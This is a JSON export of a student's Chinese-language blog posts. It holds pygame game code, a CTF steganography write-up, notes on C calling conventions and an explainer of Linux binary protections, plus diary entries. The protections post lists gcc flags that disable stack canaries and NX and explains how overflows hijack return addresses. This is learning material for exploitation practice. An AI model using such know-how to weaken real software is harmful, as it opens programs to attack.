self.screen.fill(self.button_color, self.rect)        self.screen.blit(self.msg_image, self.msg_image_rect)\n\n重构alien_invasion.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import sysfrom time import sleepimport pygamefrom settings import Settingsfrom game_stats import GameStatsfrom scoreboard import Scoreboardfrom button import Buttonfrom ship import Shipfrom bullet import Bulletfrom alien import Alien&quot;&quot;&quot;管理游戏资源和行为的类&quot;&quot;&quot;class AlienInvasion:    def __init__(self):        &quot;&quot;&quot;初始化游戏并创建游戏资源&quot;&quot;&quot;        pygame.init()        self.settings = Settings()        self.screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)        self.settings.screen_width = self.screen.get_rect().width        self.settings.screen_height = self.screen.get_rect().height        pygame.display.set_caption(&quot;Alien Invasion&quot;)        &quot;&quot;&quot;创建一个实例来存储游戏统计信息，并创建一个记分板。&quot;&quot;&quot;        self.stats = GameStats(self)        self.sb = Scoreboard(self)        self.ship = Ship(self)        self.bullets = pygame.sprite.Group()        self.aliens = pygame.sprite.Group()        self._create_fleet()        &quot;&quot;&quot;设置play&quot;&quot;&quot;        self.play_button = Button(self, &quot;Play&quot;)    &quot;&quot;&quot;开启游戏并循环&quot;&quot;&quot;    def run_game(self):        while True:            self._check_events()            if self.stats.game_active:                self.ship.update()                self._update_bullets()                self._update_aliens()            self._update_screen()    &quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;    def _check_events(self):        for event in pygame.event.get():            if event.type == pygame.QUIT:                sys.exit()            elif event.type == pygame.KEYDOWN:                self._check_keydown_events(event)            elif event.type == pygame.KEYUP:                self._check_keyup_events(event)            elif event.type == pygame.MOUSEBUTTONDOWN:                mouse_pos = pygame.mouse.get_pos()                self._check_play_button(mouse_pos)    &quot;&quot;&quot;当玩家单击播放时开始新游戏&quot;&quot;&quot;    def _check_play_button(self, mouse_pos):        &quot;&quot;&quot;Start a new game when the player clicks Play.&quot;&quot;&quot;        button_clicked = self.play_button.rect.collidepoint(mouse_pos)        if button_clicked and not self.stats.game_active:            #重置游戏设置            self.settings.initialize_dynamic_settings()            #重置游戏统计信息            self.stats.reset_stats()            self.stats.game_active = True            self.sb.prep_score()            self.sb.prep_level()            self.sb.prep_ships()            #摆脱任何剩余的外星人和子弹            self.aliens.empty()            self.bullets.empty()                        #建立一个新的舰队并集中舰船            self._create_fleet()            self.ship.center_ship()            #隐藏鼠标光标            pygame.mouse.set_visible(False)    &quot;&quot;&quot;响应按键&quot;&quot;&quot;    def _check_keydown_events(self, event):        if event.key == pygame.K_RIGHT:            self.ship.moving_right = True        elif event.key == pygame.K_LEFT:            self.ship.moving_left = True        elif event.key == pygame.K_q:            sys.exit()        elif event.key == pygame.K_SPACE:            self._fire_bullet()        &quot;&quot;&quot;释放按键&quot;&quot;&quot;    def _check_keyup_events(self, event):        if event.key == pygame.K_RIGHT:            self.ship.moving_right = False        elif event.key == pygame.K_LEFT:            self.ship.moving_left = False    &quot;&quot;&quot;创建一个新的项目符号并将其添加到项目符号组&quot;&quot;&quot;    def _fire_bullet(self):        if len(self.bullets) &lt; self.settings.bullets_allowed:            new_bullet = Bullet(self)            self.bullets.add(new_bullet)    &quot;&quot;&quot;更新项目符号的位置并摆脱旧项目符号&quot;&quot;&quot;    def _update_bullets(self):        # 更新子弹位置        self.bullets.update()        # 消除子弹        for bullet in self.bullets.copy():            if bullet.rect.bottom &lt;= 0:                 self.bullets.remove(bullet)        self._check_bullet_alien_collisions()    &quot;&quot;&quot;子弹与外星人的碰撞&quot;&quot;&quot;    def _check_bullet_alien_collisions(self):        # 消除被打到的子弹和外星人        collisions = pygame.sprite.groupcollide(                self.bullets, self.aliens, True, True)        if collisions:            for aliens in collisions.values():                self.stats.score += self.settings.alien_points * len(aliens)            self.sb.prep_score()            self.sb.check_high_score()        if not self.aliens:            # 销毁现有子弹并建立新的舰队            self.bullets.empty()            self._create_fleet()            self.settings.increase_speed()            # Increase level.            self.stats.level += 1            self.sb.prep_level()    &quot;&quot;&quot;检查舰队是否处于边缘，然后更新舰队中所有外星人的位置。&quot;&quot;&quot;    def _update_aliens(self):        self._check_fleet_edges()        self.aliens.update()        # 寻找与外星人的碰撞        if pygame.sprite.spritecollideany(self.ship, self.aliens):            self._ship_hit()        # 寻找外星人撞到屏幕底部        self._check_aliens_bottom()    &quot;&quot;&quot;检查是否有任何外星人到达屏幕底部&quot;&quot;&quot;    def _check_aliens_bottom(self):        screen_rect = self.screen.get_rect()        for alien in self.aliens.sprites():            if alien.rect.bottom &gt;= screen_rect.bottom:                # Treat this the same as if the ship got hit.                self._ship_hit()                break    &quot;&quot;&quot;被外星人击中&quot;&quot;&quot;    def _ship_hit(self):        if self.stats.ships_left &gt; 0:            # 减少生命，并更新记分板.            self.stats.ships_left -= 1            self.sb.prep_ships()                        # 摆脱任何剩余的外星人和子弹.            self.aliens.empty()            self.bullets.empty()                        # 建立一个新的舰队并集中舰船.            self._create_fleet()            self.ship.center_ship()                        # 暂停            sleep(0.5)        else:            self.stats.game_active = False            pygame.mouse.set_visible(True)    &quot;&quot;&quot;建立外星人的舰队&quot;&quot;&quot;    def _create_fleet(self):        # 创建一个外星人并连续查找外星人的数量。        # 每个外星人之间的间距等于一个外星人的宽度。        alien = Alien(self)        alien_width, alien_height = alien.rect.size        available_space_x = self.settings.screen_width - (2 * alien_width)        number_aliens_x = available_space_x // (2 * alien_width)                # 确定适合屏幕的外星人行数        ship_height = self.ship.rect.height        available_space_y = (self.settings.screen_height -                                (3 * alien_height) - ship_height)        number_rows = available_space_y // (2 * alien_height)                # 建立完整的外星人舰队.        for row_number in range(number_rows):            for alien_number in range(number_aliens_x):                self._create_alien(alien_number, row_number)    &quot;&quot;&quot;创建外星人并将其放置在行中&quot;&quot;&quot;    def _create_alien(self, alien_number, row_number):        alien = Alien(self)        alien_width, alien_height = alien.rect.size        alien.x = alien_width + 2 * alien_width * alien_number        alien.rect.x = alien.x        alien.rect.y = alien.rect.height + 2 * alien.rect.height * row_number        self.aliens.add(alien)    &quot;&quot;&quot;如果有任何外星人到达边缘，请做出适当的反应&quot;&quot;&quot;    def _check_fleet_edges(self):        for alien in self.aliens.sprites():            if alien.check_edges():                self._change_fleet_direction()                break                def _change_fleet_direction(self):        &quot;&quot;&quot;放下整个舰队并更改舰队的方向.&quot;&quot;&quot;        for alien in self.aliens.sprites():            alien.rect.y += self.settings.fleet_drop_speed        self.settings.fleet_direction *= -1    &quot;&quot;&quot;更新屏幕上的图像，然后切换到新屏幕&quot;&quot;&quot;    def _update_screen(self):        &quot;&quot;&quot;Update images on the screen, and flip to the new screen.&quot;&quot;&quot;        self.screen.fill(self.settings.bg_color)        self.ship.blitme()        for bullet in self.bullets.sprites():            bullet.draw_bullet()        self.aliens.draw(self.screen)        # 绘制分数信息.        self.sb.show_score()        #如果游戏处于非活动状态，请绘制播放按钮.        if not self.stats.game_active:            self.play_button.draw_button()        pygame.display.flip()if __name__ == &#x27;__main__&#x27;:    # 运行游戏    ai = AlienInvasion()    ai.run_game()\n\n总结在设计时是需要不断对每个模块进行重构，重构的目的一是为了使代码看起来更简洁，而是优化代码，减少不必要的代码。除此之外，还需要对项目进行不断检查，检查是否有bug，对bug要进行即使修改。还有，python虽然使用起来非常方便，但是需要记住的函数却很多，要熟练的使用，必须要能够熟悉相关的第三方库，这样才能做到游刃有余。\n","slug":"pygame使用","date":"2021-05-12T12:25:39.000Z","categories_index":"心得","tags_index":"python","author_index":"Krito"},{"id":"1521d5bfeaaa79eb316ce7916671f885","title":"蓝帽杯MISC","content":"冰墩墩拿到附件拖进虚拟机中使用binwalk查看\n\n发现里面存在rar压缩包，使用foremost进行分离\n\n\n发现音频和提示\n将音频放进010，在结尾发现cipher\n将对应的十六进制码复制下来，搜索以0~F编码的加密方式，发现是url编码。\n对十六进制码进行处理\n解码后发现是一堆表情包\n对表情包进行解码发现无法翻译，搜索了一下发现可能是emoji-aes加密，但缺少密匙，之后回去在看mp3文件，想到misc里面有一个MP3stego的工具，但是还需要一个密码才有行，想到之前的eight numbers，加上题目名称，猜测可能是冬奥会举办日期20220204\n得到一个txt文件，发现是python里面的一种编码方式\n发现是wingdings图标，在线解码，得到密匙How_6ad_c0uld_a_1cePeak_be?   之后进行emoji-aes解码得到flag\n","slug":"蓝帽杯MISC","date":"2021-05-04T02:34:09.000Z","categories_index":"MISC","tags_index":"write up","author_index":"Krito"},{"id":"20bf7105b3d9595b11047eca410abfeb","title":"C语言函数调用与常见调用约定","content":"函数调用下面代码展示了一个简单的加法子函数调用\n12345678910#include&lt;stdio.h&gt;int plus (int a,int b)&#123;    return a+b;&#125;void main()&#123;    int a=1,b=2,c;    c=plus(a,b);&#125;\n\n进入反汇编查看\n\n首先，系统会将1，2分别移动到a，b对应的地址中，之后从右至左将b，a对应地址的值移动到eax，ecx中，之后进行跳转到plus函数的plt表\n\n再跳转到plus函数的实际中\n\n子函数先是把ebp保存在栈中，之后通过mov指令将ebp指向esp指向的位置，esp再进行抬栈处理，然后保存现场（将ebx，esi，edi存储的值保存在堆栈中）,接下来把ebp-0ch对应的地址移动到edi中。之后向ecx赋30h，向eax赋0CCCCCCCCh，然后对es:edi对应的地址开始循环赋值（整个过程就是对缓冲区初始化）。（后面两个不知道是什么，太菜了😅）\n补：缓冲区用于存储函数调用里面申请的变量，因为这些变量存放在缓冲区，当调用完成后缓冲区会被丢弃，所以函数调用里面的变量无法被函数外面访问到\n\n接下来就是将a的值移动到eax中再加b的值，后面再恢复现场，再内平栈（add esp 0C0h）,之后比较esp，ebp是否相同，（如果相同我也不知道会怎么样，😅），然后将esp指向ebp指向的位置，将ebp返回到原来的地方。\n\n最后外平栈（add esp,8），将计算结果从eax移到变量c对应的地址中，至此完成函数调用\n\n常见的三种调用约定（32位）\n第一种就是系统默认的调用约定，调用者清理栈，就是和上面外平栈（add esp,8）差不多\n第二种就是在返回时对ret进行处理，使栈指针指向调用参数前的地址（如：ret 8）\n第三种就是通过寄存器传参，但如果寄存器不够还是得借助栈来传参，因为cpu与寄存器之间传递相对于cpu与内存更快，所以第三种方法在参数较少时，更加高效。\n","slug":"C语言函数调用与常见调用约定","date":"2021-04-25T14:02:30.000Z","categories_index":"C语言","tags_index":"收获","author_index":"Krito"},{"id":"49b5f2dc0a9e31a5cb54c844157811ae","title":"Linux常见的保护机制","content":"checksec（gdb安装好就有）gdb动态调试软件，必备。\n安装：\n1apt-get install gdb\n\n用法作用：它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。\n用法：checksec filename\n例子：\n123456gdb-peda$ checksec startCANARY    : disabled(这个选项表示栈保护功能有没有开启。)FORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabled\n\nCANNARY(栈保护)栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈中高危区插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。**\ngcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。\n因此在编译时可以控制是否开启栈保护以及程度，例如：\n123gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;禁用栈保护gcc -fstack-protector -o test test.c   &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码\n\nFORTIFY(轻微的检查)fority其实是非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memepy,stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf， vsprintf，vsnprintf, gets以及宽字符的变体。FORTIFY_ SOURCE设为1,并且将编译器设置为优化1(gcc -01)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能。\n1234gcc -o test test.c &#x2F;&#x2F; 默认情况下，不会开这个检查 gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查 gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进⾏检查 (特别像某些头⽂件 #include &lt;str _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编 gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查 gcc -D_FORTIFY_SOURCE&#x3D;2 程序执⾏时也会有检查 (如果检查到缓冲区溢出，就终⽌程序) _FORTIFY_SOURCE设为2，有些检查功能会加⼊，但是这可能导致程序崩溃。\n\n\n\nNX（DEP）NX（ DEP）的基本原理是将数据所在内存⻚标识为不可执⾏,当程序溢出成功转⼊shellcode时，程序会尝试在数据⻚⾯上执⾏指令，此时CPU就会抛出异常 ,⽽不是去执⾏恶意指令 。 \n123gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护gcc -z execstack -o test test.c &#x2F;&#x2F; 禁⽤NX保护 gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护\n\n在Windows下，类似的概念为DEP（数据执行保护）,数据执⾏保护( D E P ) （ Data Execution Prevention ） 是⼀套软硬件技术，能 够 在 内 存上执⾏额外检查以帮助防⽌在系统上运⾏恶意代码 ,在最新版的Visual Studio中默认开启了DEP编译选项。\nPIE（ASLR）可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。PIE和ASLR不是一样的作用，ASLR只能对堆、栈,ibc和mmap随机化，而不能对代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。联系点在于在开启ASLR之后，PIE才会生效。\n12345gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIE gcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1 gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最⾼强度2 gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最⾼强度2，不会开启PIE\n\n\n\nASLR (Address Space Layout Randomization)ASLR是⼀种针对缓冲区溢出的安全保护技术,通过对堆栈 、共享库映射等线性区布局的随机化，通过增加攻击者预测⽬的地址的难度,防⽌攻击者直接定位攻击代码位置,达到阻⽌溢出攻击的⽬的。 \n参考文章：https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/\n","slug":"linux程序的常⽤保护机制","date":"2021-04-09T13:14:59.000Z","categories_index":"PWN","tags_index":"基础知识","author_index":"Krito"},{"id":"ea7bb1240e1dab8cf5209f8a8c9f1924","title":"快乐周五","content":"\n\n\n\n\n\n\n\n\n这是这几个月最值得纪念的周五，体验了脱离学校的快乐\n2020.12.13\n  晚上和社团其它人一起谋划着“出校大计”，原本定在周六，但是由于学校要体测（挺佩服学校挑时间的能力🤬），不得不将时间改成周五，让快乐减少了一半😔\n2020.12.15\n  果然到了周末就会发现屁事很多😔，一个个周末都有事，只剩几个大男人可以出去，这次出校也变成了“罗汉出行”，照这样下去，不知道之后几天会发生什么😱\n2020.12.17\n  原本课上得好好的，突然一个朋友说周六体测取消了，改了时间，我直接当场爆炸🤬，没办法假条都上交了，时间也不能修改，只能认命\n2020.12.18\n  原本计划好的五个人，要走的时候最后一个人掉链子😔，最后变成四罗汉出行。\n开始打算看电影，但是觉得没什么好看的电影加上时间不够，所以改成了密室逃脱（补充一下，有个当地人带路非常重要😃）\n\n\n\n\n\n\n游戏体验还不错（除了那个怕鬼的师兄），还送了一个纪念品（下面的是买奶茶送的纪念品）😃\n\n\n最后去吃了碗拉面，味道还是相当不错的，就是价格有点小贵/(ㄒoㄒ)/~~\n饭后去逛了一下，带点东西给室友，最后打的回校\n\n\n  这次行程还是不错的（比呆在学校好多了），发现南昌还是蛮好玩的，但就是不知道下次出去是什么时候了😔\n","slug":"tuoli","date":"2020-12-19T02:48:28.000Z","categories_index":"生活","tags_index":"娱乐","author_index":"Krito"},{"id":"ce9156f0e3c852946bbfbbd9e0a335db","title":"我的第一篇文章","content":"新的开始这是本人第一次搭博客，走了许多弯路，经过了无数次的失败，浪费了大量的时间，但最终还是搭建完成。在这其中，我请教了石师兄和高师兄，借鉴了B站的视频，才最终成功。最后，我希望迈出这一小步后能够继续向前，并成为我想成为的人。\n\n\n音频测试照片\n\n音乐\n\n视频\n\n\n","slug":"My-First-Post","date":"2020-11-21T07:48:03.000Z","categories_index":"心得","tags_index":"感想","author_index":"Krito"}]